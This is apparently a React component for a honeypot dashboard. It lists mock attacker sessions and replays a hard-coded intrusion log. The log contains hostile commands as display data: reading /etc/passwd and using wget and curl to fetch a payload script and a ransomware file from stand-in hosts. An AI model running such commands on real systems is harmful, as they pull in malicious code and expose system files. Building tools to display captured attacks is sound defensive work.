import { Play, FileText } from "lucide-react";
import { useState } from "react";

interface Session {
  id: string;
  ip: string;
  timestamp: string;
  duration: string;
  commands: number;
}

const mockSessions: Session[] = [
  { id: 'SES-001', ip: '185.220.101.45', timestamp: '2025-10-14 18:23:45', duration: '12m 34s', commands: 23 },
  { id: 'SES-002', ip: '103.41.204.122', timestamp: '2025-10-14 18:15:12', duration: '8m 12s', commands: 15 },
  { id: 'SES-003', ip: '45.142.212.61', timestamp: '2025-10-14 18:08:33', duration: '15m 45s', commands: 31 },
  { id: 'SES-004', ip: '194.26.192.45', timestamp: '2025-10-14 17:58:22', duration: '5m 23s', commands: 8 },
];

export const SessionPlayback = () => {
  const [selectedSession, setSelectedSession] = useState<string | null>(null);

  const sessionLogs = [
    '$ ssh root@192.168.1.100',
    'root@192.168.1.100 password: ********',
    'Welcome to Ubuntu 20.04.3 LTS (GNU/Linux 5.4.0-88-generic x86_64)',
    '$ whoami',
    'root',
    '$ ls -la',
    'total 48',
    'drwxr-xr-x  6 root root 4096 Oct 14 18:23 .',
    'drwxr-xr-x 24 root root 4096 Oct 14 17:45 ..',
    '$ cat /etc/passwd',
    'root:x:0:0:root:/root:/bin/bash',
    'daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin',
    '$ wget http://malicious.site/payload.sh',
    '--2025-10-14 18:24:15--  http://malicious.site/payload.sh',
    'Resolving malicious.site... failed: Name or service not known.',
    '$ curl -O http://exploit.com/ransomware.py',
    'curl: (6) Could not resolve host: exploit.com',
    '$ exit',
    'Connection to 192.168.1.100 closed.',
  ];

  return (
    <div className="glass-card border border-primary/20 p-4 h-full flex flex-col">
      <div className="flex items-center gap-2 mb-3 pb-2 border-b border-primary/20">
        <Play className="w-5 h-5 text-primary" />
        <h2 className="text-lg font-semibold terminal-font text-primary">SESSION PLAYBACK</h2>
      </div>

      <div className="grid grid-cols-1 lg:grid-cols-2 gap-4 flex-1">
        {/* Session List */}
        <div className="space-y-2 overflow-y-auto">
          {mockSessions.map((session) => (
            <div
              key={session.id}
              onClick={() => setSelectedSession(session.id)}
              className={`glass-card p-3 border cursor-pointer transition-all hover:border-primary/50 ${
                selectedSession === session.id ? 'border-primary glow-border' : 'border-primary/20'
              }`}
            >
              <div className="flex items-center justify-between mb-2">
                <span className="terminal-font font-semibold text-primary">{session.id}</span>
                <span className="text-xs text-muted-foreground terminal-font">{session.duration}</span>
              </div>
              <div className="text-sm space-y-1">
                <div className="flex items-center gap-2">
                  <span className="text-muted-foreground">IP:</span>
                  <span className="terminal-font text-foreground">{session.ip}</span>
                </div>
                <div className="flex items-center gap-2">
                  <span className="text-muted-foreground">Time:</span>
                  <span className="terminal-font text-foreground text-xs">{session.timestamp}</span>
                </div>
                <div className="flex items-center gap-2">
                  <FileText className="w-3 h-3 text-warning" />
                  <span className="text-warning terminal-font text-xs">{session.commands} commands</span>
                </div>
              </div>
            </div>
          ))}
        </div>

        {/* Session Terminal */}
        <div className="glass-card border border-primary/20 p-4 bg-black/50">
          {selectedSession ? (
            <div className="terminal-font text-sm space-y-1 overflow-y-auto h-full">
              {sessionLogs.map((log, index) => (
                <div key={index} className="text-success">
                  {log.startsWith('$') ? (
                    <span className="text-primary font-bold">{log}</span>
                  ) : log.includes('failed') || log.includes('Could not') ? (
                    <span className="text-destructive">{log}</span>
                  ) : (
                    <span className="text-foreground/80">{log}</span>
                  )}
                </div>
              ))}
              <span className="cursor-blink text-primary">█</span>
            </div>
          ) : (
            <div className="flex items-center justify-center h-full text-muted-foreground terminal-font">
              Select a session to view playback
            </div>
          )}
        </div>
      </div>
    </div>
  );
};
